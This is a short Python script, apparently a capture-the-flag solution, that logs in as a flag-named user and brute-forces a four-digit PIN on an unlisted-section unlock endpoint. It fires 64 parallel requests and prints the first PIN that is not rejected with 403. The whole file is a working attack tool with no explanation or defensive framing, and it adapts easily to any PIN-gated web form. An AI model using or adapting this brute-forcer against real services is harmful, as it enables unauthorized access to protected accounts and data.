#!/usr/bin/env python3
# brute_pin.py — exhaust the 4-digit unlisted-section PIN.
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed

BASE = "http://<target>:5000"
USER = "superdiscreetflaguser"
PASSWORD = "password123"

s = requests.Session()
s.post(f"{BASE}/login", data={"username": USER, "password": PASSWORD}, timeout=15)
cookie = {"session": s.cookies.get("session")}

def try_pin(n):
    r = requests.post(
        f"{BASE}/account/unlisted/unlock",
        data={"pin": f"{n:04d}"},
        cookies=cookie,
        timeout=20,
        allow_redirects=False,
    )
    return f"{n:04d}" if r.status_code != 403 else None

with ThreadPoolExecutor(max_workers=64) as ex:
    futures = [ex.submit(try_pin, i) for i in range(10000)]
    for f in as_completed(futures):
        pin = f.result()
        if pin:
            print(f"[+] PIN found: {pin}")
            break
